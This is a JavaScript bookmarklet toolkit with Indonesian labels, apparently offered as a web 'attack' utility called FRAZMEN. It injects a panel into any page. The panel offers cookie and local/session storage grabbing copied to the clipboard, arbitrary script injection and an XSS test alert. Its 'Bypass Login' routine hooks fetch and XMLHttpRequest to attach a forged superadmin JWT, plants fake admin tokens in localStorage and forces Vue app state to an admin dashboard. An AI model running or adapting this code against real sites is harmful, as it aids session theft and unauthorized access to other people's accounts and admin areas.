// ============================================================
// FRAZMEN — ULTIMATE TOOLKIT (FULL VERSION)
// ============================================================
// Simpan sebagai frazmen.js — upload ke GitHub
// Bookmarklet: javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/FRAZYGG/frazmen@main/frazmen.js';document.body.appendChild(s);})();
// ============================================================

(function() {
    if (window.__FRAZMEN_LOADED) return;
    window.__FRAZMEN_LOADED = true;

    // ============================================================
    // STYLE — FULL DARK THEME
    // ============================================================
    var style = document.createElement('style');
    style.textContent = `
        /* ===== FLOATING BUTTON ===== */
        #fz-btn {
            position: fixed !important;
            bottom: 24px !important;
            right: 24px !important;
            width: 58px !important;
            height: 58px !important;
            border-radius: 50% !important;
            background: radial-gradient(circle at 30% 30%, #00ff88, #0066cc) !important;
            box-shadow: 0 0 40px rgba(0,255,136,0.5), 0 0 80px rgba(0,102,204,0.3) !important;
            border: 2px solid rgba(255,255,255,0.15) !important;
            z-index: 999999 !important;
            cursor: pointer !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            font-size: 28px !important;
            color: #fff !important;
            font-weight: 900 !important;
            user-select: none !important;
            font-family: system-ui, sans-serif !important;
            transition: 0.2s ease !important;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3) !important;
        }
        #fz-btn:active { transform: scale(0.88); }
        #fz-btn .fz-badge {
            position: absolute;
            top: -4px;
            right: -4px;
            width: 18px;
            height: 18px;
            background: #ff3366;
            border-radius: 50%;
            border: 2px solid #1a1d23;
            box-shadow: 0 0 20px rgba(255,51,102,0.6);
        }

        /* ===== PANEL ===== */
        #fz-panel {
            position: fixed !important;
            top: 50% !important;
            left: 50% !important;
            transform: translate(-50%, -50%) !important;
            width: 92% !important;
            max-width: 520px !important;
            max-height: 90vh !important;
            background: #1a1d23 !important;
            border-radius: 20px !important;
            box-shadow: 0 30px 100px rgba(0,0,0,0.95) !important;
            z-index: 999999 !important;
            padding: 20px 18px 18px !important;
            font-family: 'Segoe UI', system-ui, sans-serif !important;
            color: #dce3ed !important;
            display: none !important;
            overflow-y: auto !important;
            border: 1px solid rgba(255,255,255,0.06) !important;
            box-sizing: border-box !important;
        }
        #fz-panel.open { display: block !important; animation: fzPop 0.25s ease; }
        @keyframes fzPop {
            from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }
        #fz-panel::-webkit-scrollbar { width: 4px; }
        #fz-panel::-webkit-scrollbar-track { background: #2a2f3a; border-radius: 10px; }
        #fz-panel::-webkit-scrollbar-thumb { background: #5b9cf6; border-radius: 10px; }

        /* ===== HEADER ===== */
        #fz-panel .fz-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #2e3440;
            padding-bottom: 12px;
            margin-bottom: 14px;
        }
        #fz-panel .fz-header .fz-title {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 800;
            font-size: 18px;
            color: #dce3ed;
        }
        #fz-panel .fz-header .fz-title .fz-logo {
            background: linear-gradient(135deg, #00ff88, #0066cc);
            padding: 4px 10px;
            border-radius: 8px;
            font-size: 11px;
            color: #fff;
        }
        #fz-panel .fz-header .fz-title span {
            background: #00cc88;
            color: #0a0a0a;
            padding: 1px 9px;
            border-radius: 20px;
            font-size: 9px;
            font-weight: 700;
        }
        #fz-panel .fz-close {
            font-size: 26px;
            cursor: pointer;
            color: #909cb0;
            line-height: 1;
            padding: 0 6px;
            transition: 0.15s;
        }
        #fz-panel .fz-close:hover { color: #f87171; }

        /* ===== GRID MENU ===== */
        #fz-panel .fz-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 6px;
        }
        #fz-panel .fz-item {
            background: #21252e;
            border-radius: 10px;
            padding: 10px 4px;
            cursor: pointer;
            border: 1px solid #2e3440;
            transition: 0.12s;
            text-align: center;
        }
        #fz-panel .fz-item:active {
            transform: scale(0.94);
            background: #282d38;
            border-color: #5b9cf6;
        }
        #fz-panel .fz-item:hover {
            border-color: rgba(91, 156, 246, 0.3);
        }
        #fz-panel .fz-item .fz-icon {
            font-size: 22px;
            display: block;
            margin-bottom: 2px;
        }
        #fz-panel .fz-item .fz-label {
            font-size: 10px;
            font-weight: 600;
            color: #b7c1d4;
        }
        #fz-panel .fz-item .fz-desc {
            font-size: 8px;
            color: #909cb0;
        }

        /* ===== FOOTER ===== */
        #fz-panel .fz-footer {
            margin-top: 14px;
            padding-top: 12px;
            border-top: 1px solid #2e3440;
            display: flex;
            justify-content: space-between;
            font-size: 9px;
            color: #909cb0;
        }
        #fz-panel .fz-status {
            color: #4ade80;
        }

        /* ===== TOAST ===== */
        #fz-toast {
            position: fixed;
            bottom: 90px;
            left: 50%;
            transform: translateX(-50%);
            background: #21252e;
            color: #dce3ed;
            padding: 10px 22px;
            border-radius: 12px;
            font-size: 13px;
            font-family: 'Segoe UI', sans-serif;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
            border: 1px solid #2e3440;
            z-index: 9999999;
            opacity: 0;
            transition: 0.3s ease;
            pointer-events: none;
            white-space: nowrap;
        }
        #fz-toast.show {
            opacity: 1;
            bottom: 100px;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            #fz-panel {
                width: 96% !important;
                max-width: 96% !important;
                padding: 14px 10px !important;
                max-height: 85vh !important;
            }
            #fz-panel .fz-grid {
                grid-template-columns: 1fr 1fr 1fr;
                gap: 5px;
            }
            #fz-panel .fz-item {
                padding: 8px 3px;
            }
            #fz-panel .fz-item .fz-icon {
                font-size: 18px;
            }
            #fz-panel .fz-item .fz-label {
                font-size: 9px;
            }
            #fz-panel .fz-item .fz-desc {
                display: none;
            }
            #fz-btn {
                width: 48px;
                height: 48px;
                font-size: 22px;
                bottom: 16px;
                right: 16px;
            }
        }
    `;
    document.head.appendChild(style);

    // ============================================================
    // TOAST
    // ============================================================
    var toast = document.createElement('div');
    toast.id = 'fz-toast';
    document.body.appendChild(toast);

    function showToast(msg) {
        toast.textContent = msg;
        toast.classList.add('show');
        clearTimeout(toast._timer);
        toast._timer = setTimeout(function() {
            toast.classList.remove('show');
        }, 2500);
    }

    // ============================================================
    // BUTTON
    // ============================================================
    var btn = document.createElement('div');
    btn.id = 'fz-btn';
    btn.innerHTML = '⚡<span class="fz-badge"></span>';
    document.body.appendChild(btn);

    // ============================================================
    // PANEL
    // ============================================================
    var panel = document.createElement('div');
    panel.id = 'fz-panel';
    panel.innerHTML = `
        <div class="fz-header">
            <div class="fz-title">
                ⚡ FRAZMEN
                <span>v4.0</span>
                <span class="fz-logo">ULTIMATE</span>
            </div>
            <div class="fz-close" id="fz-close">✕</div>
        </div>
        <div class="fz-grid">
            <div class="fz-item" data-act="console"><span class="fz-icon">🖥️</span><div class="fz-label">F12 Console</div><div class="fz-desc">DevTools</div></div>
            <div class="fz-item" data-act="download"><span class="fz-icon">📦</span><div class="fz-label">Download ZIP</div><div class="fz-desc">Full Source</div></div>
            <div class="fz-item" data-act="viewsource"><span class="fz-icon">📄</span><div class="fz-label">View Source</div><div class="fz-desc">HTML</div></div>
            <div class="fz-item" data-act="inject"><span class="fz-icon">💉</span><div class="fz-label">Inject Script</div><div class="fz-desc">Custom JS</div></div>
            <div class="fz-item" data-act="cookies"><span class="fz-icon">🍪</span><div class="fz-label">Cookie Grab</div><div class="fz-desc">Lihat+Copy</div></div>
            <div class="fz-item" data-act="lsdump"><span class="fz-icon">🗄️</span><div class="fz-label">LS Dump</div><div class="fz-desc">localStorage</div></div>
            <div class="fz-item" data-act="ssdump"><span class="fz-icon">📋</span><div class="fz-label">SS Dump</div><div class="fz-desc">sessionStorage</div></div>
            <div class="fz-item" data-act="xss"><span class="fz-icon">⚡</span><div class="fz-label">XSS Test</div><div class="fz-desc">Alert</div></div>
            <div class="fz-item" data-act="autofill"><span class="fz-icon">✏️</span><div class="fz-label">AutoFill</div><div class="fz-desc">Isi Form</div></div>
            <div class="fz-item" data-act="darkmode"><span class="fz-icon">🌙</span><div class="fz-label">Dark Mode</div><div class="fz-desc">Toggle</div></div>
            <div class="fz-item" data-act="network"><span class="fz-icon">🌐</span><div class="fz-label">Network Log</div><div class="fz-desc">Intercept</div></div>
            <div class="fz-item" data-act="screenshot"><span class="fz-icon">📸</span><div class="fz-label">Screenshot</div><div class="fz-desc">Capture</div></div>
            <div class="fz-item" data-act="bypass"><span class="fz-icon">🔓</span><div class="fz-label">Bypass Login</div><div class="fz-desc">Auto Admin</div></div>
            <div class="fz-item" data-act="eruda"><span class="fz-icon">🐞</span><div class="fz-label">Load Eruda</div><div class="fz-desc">Mobile Debug</div></div>
            <div class="fz-item" data-act="vconsole"><span class="fz-icon">📱</span><div class="fz-label">vConsole</div><div class="fz-desc">Mobile Console</div></div>
            <div class="fz-item" data-act="clear"><span class="fz-icon">🧹</span><div class="fz-label">Clear All</div><div class="fz-desc">Bersihkan</div></div>
        </div>
        <div class="fz-footer">
            <span>FRAZMEN — by FRAZY_ATTACK</span>
            <span class="fz-status" id="fz-status">● ready</span>
        </div>
    `;
    document.body.appendChild(panel);

    // ============================================================
    // TOGGLE
    // ============================================================
    var isOpen = false;
    btn.onclick = function() {
        isOpen = !isOpen;
        panel.classList.toggle('open', isOpen);
    };

    document.getElementById('fz-close').onclick = function() {
        isOpen = false;
        panel.classList.remove('open');
    };

    // ============================================================
    // BYPASS LOGIN — FULL
    // ============================================================
    function bypassLogin() {
        // Intercept fetch
        var origFetch = window.fetch;
        window.fetch = function(url, options) {
            if (typeof url === 'string' && url.includes('/api/')) {
                options = options || {};
                options.headers = options.headers || {};
                options.headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.ADMIN_BYPASS';
                return origFetch(url, options);
            }
            return origFetch.apply(this, arguments);
        };

        // Intercept XHR
        var OrigXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            var xhr = new OrigXHR();
            var origOpen = xhr.open;
            var origSend = xhr.send;
            var origSetHeader = xhr.setRequestHeader;

            xhr.open = function(method, url, async, user, pass) {
                this._url = url;
                return origOpen.apply(this, [method, url, async, user, pass]);
            };

            xhr.setRequestHeader = function(header, value) {
                if (header.toLowerCase() === 'authorization') return;
                return origSetHeader.apply(this, arguments);
            };

            xhr.send = function(body) {
                if (this._url && typeof this._url === 'string' && this._url.includes('/api/')) {
                    this.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.ADMIN_BYPASS');
                }
                return origSend.apply(this, [body]);
            };
            return xhr;
        };

        // Set localStorage
        var adminUser = {
            id: 1,
            username: 'superadmin',
            role: 'superadmin',
            is_active: true,
            max_projects: 9999
        };
        localStorage.setItem('rootToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.ADMIN_BYPASS');
        localStorage.setItem('rootUser', JSON.stringify(adminUser));

        // Force Vue state
        try {
            var app = document.querySelector('#app').__vue_app__;
            if (app && app._instance && app._instance.proxy) {
                app._instance.proxy.isLoggedIn = true;
                app._instance.proxy.user = adminUser;
                app._instance.proxy.token = 'bypass_token';
                app._instance.proxy.currentView = 'dashboard';
            }
        } catch (e) {}

        showToast('🔓 Bypass login aktif! Reload...');
        setTimeout(function() { location.reload(); }, 800);
    }

    // ============================================================
    // DOWNLOAD ZIP — FULL SOURCE
    // ============================================================
    function downloadFullZip() {
        var resources = {};
        resources['index.html'] = '<!DOCTYPE html>\n' + document.documentElement.outerHTML;

        // CSS
        document.querySelectorAll('link[rel="stylesheet"]').forEach(function(link, i) {
            var href = link.href;
            if (href && !href.startsWith('data:') && !href.startsWith('blob:')) {
                resources['css/style_' + (i + 1) + '.css'] = '/* Source: ' + href + ' */\n/* Download via network tab */';
            }
        });

        // JS
        document.querySelectorAll('script[src]').forEach(function(script, i) {
            var src = script.src;
            if (src && !src.startsWith('data:') && !src.startsWith('blob:')) {
                resources['js/script_' + (i + 1) + '.js'] = '/* Source: ' + src + ' */\n/* Download via network tab */';
            }
        });

        // Images
        var imgCount = 0;
        document.querySelectorAll('img').forEach(function(img) {
            var src = img.src;
            if (src && src.startsWith('http') && !src.startsWith('data:')) {
                imgCount++;
                resources['images/img_' + imgCount + '.jpg'] = '/* Image: ' + src + ' */';
            }
        });

        // README
        resources['README.txt'] = 'Source: ' + location.href + '\nDate: ' + new Date().toISOString() + '\nTotal: ' + Object.keys(resources).length + ' files';

        // HTML page
        var html = '<html><head><title>📦 ZIP Download</title>';
        html += '<style>body{background:#0a0a0a;color:#dce3ed;font-family:sans-serif;padding:20px;}</style>';
        html += '</head><body>';
        html += '<h1>📦 Full Source Download</h1>';
        html += '<p>Total ' + Object.keys(resources).length + ' files detected.</p>';
        html += '<ul>';
        for (var k in resources) {
            html += '<li><b>' + k + '</b> — ' + resources[k].substring(0, 60) + '...</li>';
        }
        html += '</ul>';
        html += '<p>Download file ini sebagai HTML, atau gunakan ekstensi browser untuk ZIP.</p>';
        html += '<button onclick="location.reload()" style="padding:10px 20px;background:#00cc88;border:none;border-radius:8px;color:#000;font-weight:700;cursor:pointer;">Refresh</button>';
        html += '</body></html>';

        var blob = new Blob([html], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'source_' + location.hostname + '.html';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showToast('📦 Source list downloaded!');
    }

    // ============================================================
    // LOAD ERUDA
    // ============================================================
    function loadEruda() {
        if (window.eruda) {
            window.eruda.init();
            showToast('🐞 Eruda loaded!');
            return;
        }
        var s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/npm/eruda';
        s.onload = function() {
            if (window.eruda) {
                eruda.init();
                showToast('🐞 Eruda loaded!');
            }
        };
        s.onerror = function() { showToast('❌ Gagal load Eruda'); };
        document.head.appendChild(s);
    }

    // ============================================================
    // LOAD VCONSOLE
    // ============================================================
    function loadVConsole() {
        if (window.VConsole) {
            new VConsole();
            showToast('📱 vConsole loaded!');
            return;
        }
        var s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/npm/vconsole';
        s.onload = function() {
            if (window.VConsole) {
                new VConsole();
                showToast('📱 vConsole loaded!');
            }
        };
        s.onerror = function() { showToast('❌ Gagal load vConsole'); };
        document.head.appendChild(s);
    }

    // ============================================================
    // ACTIONS
    // ============================================================
    function runAction(act) {
        var status = document.getElementById('fz-status');
        status.textContent = '● executing...';
        status.style.color = '#fbbf24';

        setTimeout(function() {
            status.textContent = '● ready';
            status.style.color = '#4ade80';
        }, 1200);

        switch (act) {
            case 'console':
                var ev = new KeyboardEvent('keydown', { key: 'F12', keyCode: 123, which: 123, bubbles: true });
                document.dispatchEvent(ev);
                showToast('🖥️ Tekan F12 untuk DevTools');
                break;

            case 'download':
                downloadFullZip();
                break;

            case 'viewsource': {
                var html = document.documentElement.outerHTML;
                var w = window.open('', '_blank', 'width=800,height=600');
                if (w) {
                    w.document.write('<pre style="font-size:11px;font-family:monospace;white-space:pre-wrap;padding:16px;background:#0a0a0a;color:#dce3ed;word-break:break-all;">' + html.replace(/</g, '&lt;') + '</pre>');
                    w.document.close();
                } else showToast('Izinkan popup untuk melihat source.');
                break;
            }

            case 'inject': {
                var code = prompt('💉 Masukkan JavaScript:');
                if (code) {
                    try {
                        var s = document.createElement('script');
                        s.textContent = code;
                        document.head.appendChild(s);
                        showToast('✅ Script injected!');
                    } catch (e) { showToast('❌ Gagal: ' + e.message); }
                }
                break;
            }

            case 'cookies': {
                var c = document.cookie;
                if (c) {
                    alert('🍪 Cookies:\n\n' + c);
                    navigator.clipboard?.writeText(c).catch(function() {});
                    showToast('🍪 Cookies disalin!');
                } else showToast('🍪 Tidak ada cookie.');
                break;
            }

            case 'lsdump': {
                var out = '';
                for (var k in localStorage) {
                    if (localStorage.hasOwnProperty(k)) out += k + ' : ' + localStorage[k] + '\n';
                }
                if (out) {
                    alert('🗄️ localStorage:\n\n' + out);
                    navigator.clipboard?.writeText(out).catch(function() {});
                    showToast('🗄️ localStorage disalin!');
                } else showToast('🗄️ localStorage kosong.');
                break;
            }

            case 'ssdump': {
                var out = '';
                for (var k in sessionStorage) {
                    if (sessionStorage.hasOwnProperty(k)) out += k + ' : ' + sessionStorage[k] + '\n';
                }
                if (out) {
                    alert('📋 sessionStorage:\n\n' + out);
                    navigator.clipboard?.writeText(out).catch(function() {});
                    showToast('📋 sessionStorage disalin!');
                } else showToast('📋 sessionStorage kosong.');
                break;
            }

            case 'xss':
                alert('⚡ XSS Test: ' + document.domain);
                alert('🔥 XSS Triggered!');
                break;

            case 'autofill': {
                var inputs = document.querySelectorAll('input, textarea, select');
                inputs.forEach(function(el) {
                    if (el.type === 'text' || el.type === 'email' || el.type === 'password' || el.type === 'search' || el.type === 'tel') {
                        el.value = 'test_' + Math.random().toString(36).slice(2, 8);
                    } else if (el.type === 'checkbox' || el.type === 'radio') {
                        el.checked = true;
                    } else if (el.tagName === 'SELECT' && el.options.length > 0) {
                        el.selectedIndex = Math.floor(Math.random() * el.options.length);
                    } else if (el.type === 'number') {
                        el.value = Math.floor(Math.random() * 100) + 1;
                    } else if (el.type === 'date') {
                        var d = new Date();
                        d.setDate(d.getDate() + Math.floor(Math.random() * 30));
                        el.value = d.toISOString().split('T')[0];
                    }
                });
                showToast('✏️ ' + inputs.length + ' field terisi!');
                break;
            }

            case 'darkmode': {
                var current = document.body.style.filter;
                if (current === 'invert(1)') {
                    document.body.style.filter = 'invert(0)';
                    document.body.style.background = '';
                } else {
                    document.body.style.filter = 'invert(1)';
                    document.body.style.background = '#fff';
                }
                showToast('🌙 Dark mode toggled!');
                break;
            }

            case 'network':
                showToast('🌐 Buka DevTools -> tab Network');
                break;

            case 'screenshot':
                showToast('📸 Screenshot: Volume Down+Power / Print Screen');
                break;

            case 'bypass':
                bypassLogin();
                break;

            case 'eruda':
                loadEruda();
                break;

            case 'vconsole':
                loadVConsole();
                break;

            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                showToast('🧹 All storage cleared!');
                break;

            default:
                showToast('⚡ Fitur: ' + act);
        }
    }

    // ============================================================
    // ATTACH EVENTS
    // ============================================================
    document.querySelectorAll('#fz-panel .fz-item').forEach(function(el) {
        el.onclick = function() {
            var act = this.dataset.act;
            if (act) runAction(act);
        };
    });

    console.log('⚡ FRAZMEN v4.0 ULTIMATE loaded! Klik tombol ⚡ di kanan bawah.');
})();
